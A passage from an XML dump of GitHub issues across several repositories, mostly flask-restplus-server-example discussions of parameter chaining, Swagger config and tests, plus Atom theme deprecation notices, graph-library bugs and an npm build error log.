            sub_obj, sub_field = field.split('/')&#13;
            sub_obj = getattr(obj, sub_obj)&#13;
            if hasattr(sub_obj, sub_field):&#13;
                obj = sub_obj&#13;
                field = sub_field&#13;
        if not hasattr(obj, field):&#13;
            raise ValidationError("Field '%s' does not exist, so it cannot be patched" % field)&#13;
        setattr(obj, field, value)&#13;
        return True&#13;
```&#13;
This is obviously temporary and hard-coded for my specific use case.&#13;
But in the future I'll probably need it for more modules, and will make a PR if I have the time !&#13;
&#13;
I'm open to suggestions though.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@askz I am sorry for the late response! I think, your case is quite legal, though I had never had such a requirement yet. I will be happy to accept a PR. Your ad-hoc implementation is quite reasonable to me.</Body>
    </Comment>
  </Issue_854>
  <Issue_855>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Add faker support for initial development data ?</Title>
    <Owner>frol</Owner>
    <Body>(I am actually trying to implement it in my project, will release PR if I succeed and got the time)</Body>
    <State>open</State>
    <Comment>
      <Owner>khorolets</Owner>
      <Body>Don't think it's a good idea for additional external dependency. Also, one can add `Faker` or `Elizabeth` with no problem.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>Hi @askz, Thank you for the suggestion! I have no time to implement that myself at the moment, but I would love to see a PR for that!</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@khorolets We can always make the dependency optional and just skip if the module is missing. However, I have never worked with fakers (I prefer plain Python where things should be simple), so I am not sure if they give any benefit at all.</Body>
    </Comment>
    <Comment>
      <Owner>khorolets</Owner>
      <Body>@frol fakers make sense for fixtures for example. I think we can introduce some kind of `invoke` task to populate some fake data based on factories, but I'm not sure there is a good place for them in initial development data only. If we have task then it's ok to use that factories in initial data IMO.</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@khorolets I see.&#13;
&#13;
@askz Please, let us know if you would like to work on a PR, otherwise, we can close this issue since this adds complexity to the example for no good reason.</Body>
    </Comment>
    <Comment>
      <Owner>askz</Owner>
      <Body>@khorolets it's a good idea. &#13;
&#13;
@frol I'm working on it !</Body>
    </Comment>
  </Issue_855>
  <Issue_856>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Decorate with multiple/chained parameters</Title>
    <Owner>frol</Owner>
    <Body>I would like to add multiple parameters to an endpoint, essentially chaining them as so:&#13;
&#13;
```python&#13;
 @api.parameters(SomeParameters())&#13;
 @api.parameters(MoreParameters())&#13;
 @api.parameters(EvenMoreParameters())&#13;
 def get(self, args):&#13;
    ...&#13;
```&#13;
&#13;
However, this results in a separate dict for each set of parameters and does not concatenate the arguments as I had expected. Also, Swagger does not seem to parse all of the argument options as only the topmost decorator appears in the docs.&#13;
&#13;
![image](https://cloud.githubusercontent.com/assets/6324733/22483497/8d5e84a8-e7cb-11e6-856f-bbfab78eb00f.png)&#13;
&#13;
I could simply create another Parameters class that combines all of the fields from the others, but I'd like to avoid having to create one for each desired combination of parameters.&#13;
&#13;
Another idea I had was to create a method that would accept any number of Parameter objects and return a new dynamic Schema object with all of the combined fields. Something like:&#13;
&#13;
```python&#13;
 @api.parameters(many_params(SomeParameters(), MoreParameters(), EvenMoreParameters()))&#13;
 def get(self, args):&#13;
    ...&#13;
```&#13;
&#13;
What is the recommended approach to accomplish this? I feel like I must be missing an easier way...</Body>
    <State>open</State>
    <Comment>
      <Owner>frol</Owner>
      <Body>Currently, there are no plans to support chained parameters (simply due to the lack of time, and because implementing it the right way may take more time than it might be expected). Multiple Inheritance is the way to go now. Still, you can implement `many_params` helper yourself. It would be great if you share your experience and the implementation, so we can consider to include it into this example/boilerplate.&#13;
&#13;
*Thank you for your interest and sharing this idea!*</Body>
    </Comment>
    <Comment>
      <Owner>jdjodrey</Owner>
      <Body>Good to know, thanks @frol. I'm very appreciative of all your hard work on this project, and if I end up going the helper method route, I'll be sure to post my implementation details back here.</Body>
    </Comment>
    <Comment>
      <Owner>jdjodrey</Owner>
      <Body>Here's what I ended up going with:&#13;
&#13;
```python&#13;
def multi_params(*params):&#13;
    m = Parameters()&#13;
    for p in params:&#13;
        m.fields = dict(m.fields, **p.fields)&#13;
    return m&#13;
```&#13;
And then you can simply put that callable in the decorate and pass in any number of parameter objects to it:&#13;
```python&#13;
@api.parameters(multi_params(IncludeParameters(), OnlyParameters()))&#13;
```&#13;
It's somewhat crude and is definitely limited in handling more complex objects, but it serves my purpose for simple parameters with one or two fields (and it keeps Swagger happy too).&#13;
&#13;
For anyone looking to do something similar, please feel free to improve/refine it!</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@jdjodrey Thanks for sharing. I will just comment an obvious limitation of your implementation: custom validations defined on the classes will be ignored, and the reason I haven't touched it is that I have no idea on how to merge `@validates_schema` handlers.</Body>
    </Comment>
    <Comment>
      <Owner>soundstripe</Owner>
      <Body>I'm running across the same problem here. I'd like to add that it would be nice to be able to specify different locations for each set of parameters. Something like:&#13;
&#13;
```python&#13;
@api.parameters(AuthenticationParameters(), locations['header', ])&#13;
@api.parameters(PaginationParameters(), locations['query', ])&#13;
@api.parameters(SearchQueryParameters(), locations=['json', ])&#13;
def get():&#13;
    return {}&#13;
```&#13;
&#13;
If I come up with anything I'll drop it here.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>joeyorlando</Owner>
      <Body>&#128077; on this</Body>
    </Comment>
    <Comment>
      <Owner>bitfinity</Owner>
      <Body>@jdjodrey Your method has been working quite well for me.</Body>
    </Comment>
  </Issue_856>
  <Issue_857>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Namespace.parameters(locations=('json', 'files')) needs testing</Title>
    <Owner>frol</Owner>
    <Body>It is reported that `locations=('json', 'files')` in `@Namespace.parameters` decorator breaks Swagger config:

``` python
@api.parameters(
        parameters.CreateTeamParameters(),
        locations=('json', 'files')
)
def post(self, ...):
...
```

The Swagger config results in:

``` json
"schema": {
                            "properties": {
                                "source_file": {
                                    "type": "file"
                                },
                                ...
                            },
                            "type": "object"
                        }
```

Instead of

``` json
"parameters": [
                    {
                        "in": "formData",
                        "name": "source_file",
                        "required": false,
                        "type": "file"
                    },
                    ...
                ]
```

This might be related to #20.

/cc @DurandA 
</Body>
    <State>open</State>
    <Comment>
      <Owner>10000TB</Owner>
      <Body>Hey @frol , I'd love to work on this, but need some guidance on starting this:&#13;
&#13;
I am having a hard time running exsting tests with simple `pytest tests`. I got folllowing issue:&#13;
&#13;
```&#13;
&#10140;  flask-restplus-server-example git:(master) &#10007; pytest tests/test_app_creation.py&#13;
=========================================================================================================================================================================== test session starts ============================================================================================================================================================================&#13;
platform darwin -- Python 2.7.15, pytest-3.6.2, py-1.5.4, pluggy-0.6.0&#13;
rootdir: /Users/xuehaodavidhu/whut2eat/opensource/flask-restplus-server-example, inifile:&#13;
collected 10 items&#13;
&#13;
tests/test_app_creation.py&#13;
.FF.....FF                                                                                                                                                                                                                                                                                                                                [100%]&#13;
&#13;
================================================================================================================================================================================= FAILURES =================================================================================================================================================================================&#13;
__________________________________________________________________________________________________________________________________________________________ test_create_app_passing_flask_config_name[production] ___________________________________________________________________________________________________________________________________________________________&#13;
&#13;
monkeypatch = &lt;_pytest.monkeypatch.MonkeyPatch object at 0x106375990&gt;, flask_config_name = 'production'&#13;
&#13;
    @pytest.mark.parametrize('flask_config_name', ['production', 'development', 'testing'])&#13;
    def test_create_app_passing_flask_config_name(monkeypatch, flask_config_name):&#13;
        if flask_config_name == 'production':&#13;
            from config import ProductionConfig&#13;
            monkeypatch.setattr(ProductionConfig, 'SQLALCHEMY_DATABASE_URI', 'sqlite://')&#13;
            monkeypatch.setattr(ProductionConfig, 'SECRET_KEY', 'secret')&#13;
&gt;       create_app(flask_config_name=flask_config_name)&#13;
&#13;
tests/test_app_creation.py:22:&#13;
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _&#13;
&#13;
flask_config_name = 'production', kwargs = {}, threading = &lt;module 'threading' from '/usr/local/Cellar/python@2/2.7.15/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.pyc'&gt;, app = &lt;Flask 'app'&gt;, env_flask_config_name = 'testing'&#13;
&#13;
    def create_app(flask_config_name=None, **kwargs):&#13;
        """&#13;
        Entry point to the Flask RESTful Server application.&#13;
        """&#13;
        # This is a workaround for Alpine Linux (musl libc) quirk:&#13;
        # https://github.com/docker-library/python/issues/211&#13;
        import threading&#13;
        threading.stack_size(2*1024*1024)&#13;
&#13;
        app = Flask(__name__, **kwargs)&#13;
&#13;
        env_flask_config_name = os.getenv('FLASK_CONFIG')&#13;
        if not env_flask_config_name and flask_config_name is None:&#13;
            flask_config_name = 'local'&#13;
        elif flask_config_name is None:&#13;
            flask_config_name = env_flask_config_name&#13;
        else:&#13;
            if env_flask_config_name:&#13;
                assert env_flask_config_name == flask_config_name, (&#13;
                    "FLASK_CONFIG environment variable (\"%s\") and flask_config_name argument "&#13;
                    "(\"%s\") are both set and are not the same." % (&#13;
                        env_flask_config_name,&#13;
&gt;                       flask_config_name&#13;
                    )&#13;
                )&#13;
E               AssertionError: FLASK_CONFIG environment variable ("testing") and flask_config_name argument ("production") are both set and are not the same.&#13;
&#13;
app/__init__.py:42: AssertionError&#13;
```&#13;
&#13;
I assume we would need to set `FLASK_CONFIG` to `testing`, but that seem to have a conflict, and is blocking me from running the tests, is there any very obvious things I am misunderstanding here ?</Body>
    </Comment>
    <Comment>
      <Owner>10000TB</Owner>
      <Body>but setting `FLASK_CONFIG` to `production` works fine, but curious why ?&#13;
 </Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>@10000TB It seems that you have FLASK_CONFIG environment variable set to `production`. Try unsetting it:&#13;
&#13;
```&#13;
env FLASK_CONFIG= pytest tests/test_app_creation.py&#13;
```</Body>
    </Comment>
  </Issue_857>
  <Issue_858>
    <Repository>flask-restplus-server-example</Repository>
    <Title>Restrict responses with only documented types (@api.response(code=...))</Title>
    <Owner>frol</Owner>
    <Body>#26 showed that there might be a situation when all tests pass, the response is expected, but it was not explicitly covered with `@api.response()` decorator. I think we will need to override `Api.output` from `flask_restplus/api.py` (note, there is already customization on Api class in `flask_restplus_patched`, so you can just add this patch there), so we can check what responses are defined on the `resource`, and the current response is expected (don't forget about special care around HTTP/500 internal error, this can happen anywhere and shouldn't be shadowed).
</Body>
    <State>open</State>
    <Comment>
      <Owner>khorolets</Owner>
      <Body>May I ask you to provide a little details or just explain what do you want? :)
</Body>
    </Comment>
    <Comment>
      <Owner>frol</Owner>
      <Body>_Actually, I don't think we need to address this now._

The point of the issue is that I wanted to make sure that all possible responses are documented in Swagger and if it is not, I wanted to raise an exception (only in the Debug mode). Since you cannot inspect the code for all possible return values, I thought to make a check for what is going to be returned somewhere and check if it was documented and then tests would fail even if a resource returns a correct response.

Example, we had DELETE handlers, which returned HTTP/200, and tests passed, but HTTP/200 was not documented in the Swagger UI (nobody cared about it). I want so this won't ever repeat again, if resource returns some data with HTTP/200 and it is not documented, some sort of exception should be raised instead of silently getting response out (even if it is completely legitimate and expected).
</Body>
    </Comment>
  </Issue_858>
  <Issue_859>
    <Repository>new-ste</Repository>
    <Title>New issue</Title>
    <Owner>ehabdevel</Owner>
    <Body>This is a new issue for the new bot</Body>
    <State>open</State>
    <Comment>
      <Owner>ehabdevel</Owner>
      <Body>/depends on #1 and #2 are resolved first&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>ehabdevel</Owner>
      <Body>/depends on #1 and #2 are resolved first&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>ehabdevel</Owner>
      <Body>/depends on #1 and #2 are resolved first&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>ehabdevel</Owner>
      <Body>/depends on #1 and #2 are resolved first&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>ehabdevel</Owner>
      <Body>/depends on #1 and #2 are resolved first&#13;
&#13;
</Body>
    </Comment>
  </Issue_859>
  <Issue_860>
    <Repository>sitron</Repository>
    <Title>NanOS not supported</Title>
    <Owner>sinabakh</Owner>
    <Body>Currently, we can't compile code for NanOS because of many problems.
And the interesting point is we have no plan to support NanOS in near future (accurately,  till time exist).
</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>I think setting milestone to version 1000000.23 will fix the problem.
</Body>
    </Comment>
    <Comment>
      <Owner>sinabakh</Owner>
      <Body>It really depends on developers of NanOS.
if they work well, yes Version 1000000.23 will be a good milestone to release an alpha version.
</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>We'll be waiting...
</Body>
    </Comment>
  </Issue_860>
  <Issue_861>
    <Repository>sitron</Repository>
    <Title>OSX may not be supported</Title>
    <Owner>sinabakh</Owner>
    <Body>I am not sure but I think we can't compile code for OSX because of few problems like boost libraries.
It needs some work to configure everything to compile code on/for OSX.
</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>I can't grantee, but I hope soon enough I find the time to make it work on mac.
</Body>
    </Comment>
  </Issue_861>
  <Issue_862>
    <Repository>github-for-developers-7</Repository>
    <Title>Fix Internet Explorer and Safari formatting</Title>
    <Owner>FMCalisto</Owner>
    <Body>We need to fix the position of the photo in relation to the individual bio in both IE and Safari.
</Body>
    <State>open</State>
    <Comment>
      <Owner>FMCalisto</Owner>
      <Body>How can I do that?
</Body>
    </Comment>
  </Issue_862>
  <Issue_863>
    <Repository>github-for-developers-7</Repository>
    <Title>Class goals</Title>
    <Owner>FMCalisto</Owner>
    <Body>Please tell us one thing you would like to learn in today's class!
</Body>
    <State>open</State>
    <Comment>
      <Owner>FMCalisto</Owner>
      <Body>I would like to learn Advanced Git and GitHub skills.
</Body>
    </Comment>
  </Issue_863>
  <Issue_864>
    <Repository>autotune.docker</Repository>
    <Title>Doesn't work always work out of the box</Title>
    <Owner>cusspvz</Owner>
    <Body>I really liked the idea behind this project and tried it out "as is"  on our `Jenkins` build server under actual production work load. Some tests all of a sudden started failing; some test cases with assertion errors and some with tcp connection reset errors.

Some tuning is necessary before using it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cusspvz</Owner>
      <Body>First of all, thanks for using it!

I'm interested to know what are the variables you've changed and their values and how you've measured to reach them.

I've done my efforts to tune a server for fast TCP connections, thinking most of them as non-persistent, you know it all depends on the kind of services you're using on the server.
</Body>
    </Comment>
    <Comment>
      <Owner>Puneeth-n</Owner>
      <Body>@cusspvz Honestly, haven't had time to customize the changes. I have sidelined it for now to tackle more critical issues in our infrastructure &#128517; I will update here once I have something new.
</Body>
    </Comment>
  </Issue_864>
  <Issue_865>
    <Repository>descobrir-passwords</Repository>
    <Title>passwords not loaded</Title>
    <Owner>cusspvz</Owner>
    <Body>two solutions
1 - place passwords.json on a webserver
2 - use cordova filesystem plugin
</Body>
    <State>open</State>
    <Comment>
      <Owner>cusspvz</Owner>
      <Body>I didn't tested yet but it I think that, when running trough the compiled app, it gets `data` var as a string. 
</Body>
    </Comment>
  </Issue_865>
  <Issue_866>
    <Repository>atom-kf-dark</Repository>
    <Title>Deprecated selector in `kary-foundation-dark/index.less`</Title>
    <Owner>pmkary</Owner>
    <Body>In `kary-foundation-dark/index.less`: &#13;
&#13;
Starting from Atom v1.13.0, the contents of `atom-text-editor` elements are no longer encapsulated within a shadow DOM boundary. This means you should stop using `:host` and `::shadow` pseudo-selectors, and prepend all your syntax selectors with `syntax--`. To prevent breakage with existing style sheets, Atom will automatically upgrade the following selectors:&#13;
&#13;
* `atom-text-editor,&#13;
:host` =&gt; `atom-text-editor,atom-text-editor`&#13;
&#13;
* `atom-text-editor .gutter,&#13;
:host .gutter` =&gt; `atom-text-editor .gutter,atom-text-editor .gutter`&#13;
&#13;
* `atom-text-editor .gutter .line-number.cursor-line,&#13;
:host .gutter .line-number.cursor-line` =&gt; `atom-text-editor .gutter .line-number.cursor-line,atom-text-editor .gutter .line-number.cursor-line`&#13;
&#13;
* `atom-text-editor .gutter .line-number.cursor-line-no-selection,&#13;
:host .gutter .line-number.cursor-line-no-selection` =&gt; `atom-text-editor .gutter .line-number.cursor-line-no-selection,atom-text-editor .gutter .line-number.cursor-line-no-selection`&#13;
&#13;
* `atom-text-editor .wrap-guide,&#13;
:host .wrap-guide` =&gt; `atom-text-editor .wrap-guide,atom-text-editor .wrap-guide`&#13;
&#13;
* `atom-text-editor .indent-guide,&#13;
:host .indent-guide` =&gt; `atom-text-editor .indent-guide,atom-text-editor .indent-guide`&#13;
&#13;
* `atom-text-editor .invisible-character,&#13;
:host .invisible-character` =&gt; `atom-text-editor .invisible-character,atom-text-editor .invisible-character`&#13;
&#13;
* `atom-text-editor .search-results .marker .region,&#13;
:host .search-results .marker .region` =&gt; `atom-text-editor .search-results .syntax--marker .region,atom-text-editor .search-results .syntax--marker .region`&#13;
&#13;
* `atom-text-editor .search-results .marker.current-result .region,&#13;
:host .search-results .marker.current-result .region` =&gt; `atom-text-editor .search-results .syntax--marker.current-result .region,atom-text-editor .search-results .syntax--marker.current-result .region`&#13;
&#13;
* `atom-text-editor.is-focused .cursor,&#13;
:host(.is-focused) .cursor` =&gt; `atom-text-editor.is-focused .cursor,atom-text-editor .cursor`&#13;
&#13;
* `atom-text-editor.is-focused .selection .region,&#13;
:host(.is-focused) .selection .region` =&gt; `atom-text-editor.is-focused .selection .region,atom-text-editor .selection .region`&#13;
&#13;
* `atom-text-editor.is-focused .line-number.cursor-line-no-selection,&#13;
atom-text-editor.is-focused .line.cursor-line,&#13;
:host(.is-focused) .line-number.cursor-line-no-selection,&#13;
:host(.is-focused) .line.cursor-line` =&gt; `atom-text-editor.is-focused .line-number.cursor-line-no-selection,&#13;
atom-text-editor.is-focused .line.cursor-line,atom-text-editor .line-number.cursor-line-no-selection,atom-text-editor .line.cursor-line`&#13;
&#13;
* `.comment` =&gt; `.syntax--comment`&#13;
&#13;
* `.keyword.operator` =&gt; `.syntax--keyword.syntax--operator`&#13;
&#13;
* `.string` =&gt; `.syntax--string`&#13;
&#13;
* `.constant.numeric` =&gt; `.syntax--constant.syntax--numeric`&#13;
&#13;
* `.constant.language` =&gt; `.syntax--constant.syntax--language`&#13;
&#13;
* `.constant.character,&#13;
.constant.other` =&gt; `.syntax--constant.syntax--character,&#13;
.syntax--constant.syntax--other`&#13;
&#13;
* `.variable` =&gt; `.syntax--variable`&#13;
&#13;
* `.keyword` =&gt; `.syntax--keyword`&#13;
&#13;
* `.storage` =&gt; `.syntax--storage`&#13;
&#13;
* `.storage.type` =&gt; `.syntax--storage.syntax--type`&#13;
&#13;
* `.entity.name.class` =&gt; `.syntax--entity.syntax--name.syntax--class`&#13;
&#13;
* `.entity.other.inherited-class` =&gt; `.syntax--entity.syntax--other.syntax--inherited-class`&#13;
&#13;
* `.entity.name.function` =&gt; `.syntax--entity.syntax--name.syntax--function`&#13;
&#13;
* `.variable.parameter` =&gt; `.syntax--variable.syntax--parameter`&#13;
&#13;
* `.punctuation.definition.tag.html,&#13;
.punctuation.definition.tag.begin,&#13;
.punctuation.definition.tag.end` =&gt; `.syntax--punctuation.syntax--definition.syntax--tag.syntax--html,&#13;
.syntax--punctuation.syntax--definition.syntax--tag.syntax--begin,&#13;
.syntax--punctuation.syntax--definition.syntax--tag.syntax--end`&#13;
&#13;
* `.entity.name.tag` =&gt; `.syntax--entity.syntax--name.syntax--tag`&#13;
&#13;
* `.entity.other.attribute-name` =&gt; `.syntax--entity.syntax--other.syntax--attribute-name`&#13;
&#13;
* `.support.function` =&gt; `.syntax--support.syntax--function`&#13;
&#13;
* `.support.constant` =&gt; `.syntax--support.syntax--constant`&#13;
&#13;
* `.support.type,&#13;
.support.class` =&gt; `.syntax--support.syntax--type,&#13;
.syntax--support.syntax--class`&#13;
&#13;
* `.support.other.variable` =&gt; `.syntax--support.syntax--other.syntax--variable`&#13;
&#13;
* `.invalid` =&gt; `.syntax--invalid`&#13;
&#13;
* `.invalid.deprecated` =&gt; `.syntax--invalid.syntax--deprecated`&#13;
&#13;
* `.markup.heading` =&gt; `.syntax--markup.syntax--heading`&#13;
&#13;
* `.storage.modifier.ts` =&gt; `.syntax--storage.syntax--modifier.syntax--ts`&#13;
&#13;
* `.string.quoted.single.html,&#13;
.string.quoted.double.html,&#13;
.string.html` =&gt; `.syntax--string.syntax--quoted.syntax--single.syntax--html,&#13;
.syntax--string.syntax--quoted.syntax--double.syntax--html,&#13;
.syntax--string.syntax--html`&#13;
&#13;
* `.cast.expr.ts` =&gt; `.syntax--cast.syntax--expr.syntax--ts`&#13;
&#13;
Automatic translation of selectors will be removed in a few release cycles to minimize startup time. Please, make sure to upgrade the above selectors as soon as possible.</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@zgoda Ah thanks a lot for mentioning that. The theme is generated using the `.tmTheme` so it can be simply regenerated &#128131;. &#13;
&#13;
Thanks a lot for telling me!</Body>
    </Comment>
    <Comment>
      <Owner>ShaharHD</Owner>
      <Body>@pmkary Are there any updates?</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@ShaharHD unfortunately Atom's tokenizer is very poor. Take a look at the following examples in Visual Studio Code vs Atom:&#13;
&#13;
Visual Studio Code:&#13;
&lt;img width="684" alt="screen shot 2017-04-01 at 12 59 11 pm" src="https://cloud.githubusercontent.com/assets/2157285/24577009/25068114-16db-11e7-8311-ae62e6f6357f.png"&gt;&#13;
&#13;
Atom:&#13;
&lt;img width="734" alt="screen shot 2017-04-01 at 12 59 28 pm" src="https://cloud.githubusercontent.com/assets/2157285/24577007/15484c8a-16db-11e7-9e84-8c1b094bc5c6.png"&gt;&#13;
&#13;
And because of this technical problems an update won't effect our latest changes. The image you see is the latest theme which is not published but it still is not the same as what it has to be. And in the other side because we have a very small number of installs in Atom (~250) compared to our Visual Studio Code community (~10K) it's not that much of a priority to update the Atom version that often. &#13;
&#13;
If you have a clue on what can be done to fix this, we would love to have a new version that is colorizing right, but for now the theme won't fit right into the Atom.</Body>
    </Comment>
    <Comment>
      <Owner>ShaharHD</Owner>
      <Body>@pmkary thanks for the reply.&#13;
I'm using VSCode mainly (Typescript and Node.JS) with the same theme (so I'm one of the 10K) - but at the same time I'm using Atom for my Arduino projects (PlatformIO IDE).&#13;
&#13;
I'll try to find another theme to use on the Atom &#128175; for the Arduino projects...</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@ShaharHD it's actually very awesome that we have you in our community. Having people who use your products is always the most awesome feeling possible and at the same time it's very sad for me that I can't actually do something about it. I hope someday it becomes possible to have the themes on Atom.&#13;
&#13;
Hope you like our theme and hope you find a theme you like for the Atom.&#13;
&#13;
Thanks a lot for using our theme </Body>
    </Comment>
    <Comment>
      <Owner>ShaharHD</Owner>
      <Body>@pmkary quick question, even if it doesn't look as good, why not publish the fixed version?&#13;
you wish it to be broken in the next Atom version?&#13;
&#13;
BTW, full workbench theming coming soon https://twitter.com/BenjaminPasero/status/847582977198510081</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@ShaharHD &#13;
&#13;
&gt; quick question, even if it doesn't look as good, why not publish the fixed version?&#13;
&gt; you wish it to be broken in the next Atom version?&#13;
&#13;
There will be an update, I'm actually very busy these days so updates I push are in priority order. About the theme for now the bigger priority is having support of PHP and SCSS because of amount of the requests I got and then the next thing would be to find a way to make every default token blue in the Atom to somehow fix the problem and I'll be pushing an update to Atom soon. In one or two weeks I think. &#13;
&#13;
&gt; BTW, full workbench theming coming soon&#13;
&gt; https://twitter.com/BenjaminPasero/status/847582977198510081&#13;
&#13;
Yeah I got notified about weeks ago when submitted a bug and turned out to be duplicate of: https://github.com/Microsoft/vscode/issues/3112</Body>
    </Comment>
  </Issue_866>
  <Issue_867>
    <Repository>atom-kf-light</Repository>
    <Title>Bracket matching highlighting is not supported yet</Title>
    <Owner>pmkary</Owner>
    <Body>This theme is awesome and the only downside I found is that the bracket matching highlighting is not supported yet. I added custom bracket matching to the styles.less file as shown below but it works only if the matching bracket is on the different line and doesn't work if the matching bracket is on the same line. Please fix this.&#13;
&#13;
```&#13;
.bracket-matcher .region {&#13;
    background-color: orange;&#13;
    border-bottom: light dotted green;&#13;
    position: absolute;&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>dpo</Owner>
      <Body>Works for me, whether the matching bracket is on the same line or not. In `style.less`, you simply need to enclose your snippet in&#13;
```&#13;
.theme-kary-foundation-light {&#13;
    ...&#13;
}&#13;
```&#13;
Thanks!</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body> Dear @raghupallavi and dear @dpo; thanks a lot for using this theme. And apologies for the late reply.&#13;
&#13;
I&#8217;m having quite a development hell within this project for many technical reasons. I developed a system for unification of theme creation called [themeX](https://github.com/pmkary/themeX). This theme (which is now called Pro Colors) needs to be generated by themeX from the main definition [that is here](https://github.com/pmkary/ProColors). &#13;
&#13;
themeX currently does not have an Atom adapter because the tokenizer of Atom uses different language definitions than VS Code does (which is the reference implementation of Pro Colors) and so making the two compatible has become something very hard (since Pro Colors implements over 30 languages by specifically coloring over 500 tokens) &#13;
&#13;
Because of that the development of this package has been delayed for years and I really don&#8217;t have the time to make it happen. If I had some help and contribution on doing so, I would, but I have no contribution and so it has become very impossible for now.&#13;
&#13;
Sorry for that.</Body>
    </Comment>
  </Issue_867>
  <Issue_868>
    <Repository>Graph</Repository>
    <Title>GetDotByDotOrId will not check the validity of the id</Title>
    <Owner>pmkary</Owner>
    <Body>Abstraction Layer's `GetDotByDotOrId` will not check if the given id number exist on graph or no.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sinabakh</Owner>
      <Body>@pmkary It seems to be a bigger problem than it appears.
Cause we can't simply return `False` since it breaks the design pattern.

In other hands it seems `GetDotByNumberId` will return an empty `Dot` if no dot is found.
What really happens when it return the empty `Dot` ? and is there an easy way to check if it returned an empty Dot ?
</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@sinabakh that's interesting...
</Body>
    </Comment>
  </Issue_868>
  <Issue_869>
    <Repository>Graph</Repository>
    <Title>The Big Unknown Bug (BUB)</Title>
    <Owner>pmkary</Owner>
    <Body>It seems there is a bug (a Big Unknown BUG aka BUB) that affects the underlying engine of Graph and renders many functionalities useless or buggy.

For now we are not sure where BUB is, and this issue will be the reference issue for other functionalities affected by BUB.  
</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>I like that we have a name in honor of this bug. has screwed us big time...
</Body>
    </Comment>
    <Comment>
      <Owner>sinabakh</Owner>
      <Body>It seems BUB may be in Abstraction Layer, where we get the dot by their IDs.
It was found out in #21.
</Body>
    </Comment>
    <Comment>
      <Owner>sinabakh</Owner>
      <Body>Ok, it was found out that the problem was something else.
But the reason #21 is so important and mistakes like that may be all over the code.
</Body>
    </Comment>
  </Issue_869>
  <Issue_870>
    <Repository>KaryScript</Repository>
    <Title>Error while running build-core</Title>
    <Owner>pmkary</Owner>
    <Body>the output of error&#13;
```&#13;
&gt; karyscript@0.0.1 pack-core /home/javad/Dev/karyscript&#13;
&gt; webpack --config ./build/pack-only-compiler.js&#13;
&#13;
/usr/bin/env: &#8216;node&#8217;: No such file or directory&#13;
&#13;
npm ERR! Linux 4.4.0-64-generic&#13;
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "run" "pack-core"&#13;
npm ERR! node v4.2.6&#13;
npm ERR! npm  v3.5.2&#13;
npm ERR! file sh&#13;
npm ERR! code ELIFECYCLE&#13;
npm ERR! errno ENOENT&#13;
npm ERR! syscall spawn&#13;
npm ERR! karyscript@0.0.1 pack-core: `webpack --config ./build/pack-only-compiler.js`&#13;
npm ERR! spawn ENOENT&#13;
npm ERR! &#13;
npm ERR! Failed at the karyscript@0.0.1 pack-core script 'webpack --config ./build/pack-only-compiler.js'.&#13;
npm ERR! Make sure you have the latest version of node.js and npm installed.&#13;
npm ERR! If you do, this is most likely a problem with the karyscript package,&#13;
npm ERR! not with npm itself.&#13;
npm ERR! Tell the author that this fails on your system:&#13;
npm ERR!     webpack --config ./build/pack-only-compiler.js&#13;
npm ERR! You can get information on how to open an issue for this project with:&#13;
npm ERR!     npm bugs karyscript&#13;
npm ERR! Or if that isn't available, you can get their info via:&#13;
npm ERR!     npm owner ls karyscript&#13;
npm ERR! There is likely additional logging output above.&#13;
&#13;
npm ERR! Please include the following file with any support request:&#13;
npm ERR!     /home/javad/Dev/karyscript/npm-debug.log&#13;
&#13;
&gt; karyscript@0.0.1 after-core-pack /home/javad/Dev/karyscript&#13;
&gt; node ./build/after-pack-for-web.js&#13;
&#13;
sh: 1: node: not found&#13;
&#13;
npm ERR! Linux 4.4.0-64-generic&#13;
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "run" "after-core-pack"&#13;
npm ERR! node v4.2.6&#13;
npm ERR! npm  v3.5.2&#13;
npm ERR! file sh&#13;
npm ERR! code ELIFECYCLE&#13;
npm ERR! errno ENOENT&#13;
npm ERR! syscall spawn&#13;
npm ERR! karyscript@0.0.1 after-core-pack: `node ./build/after-pack-for-web.js`&#13;
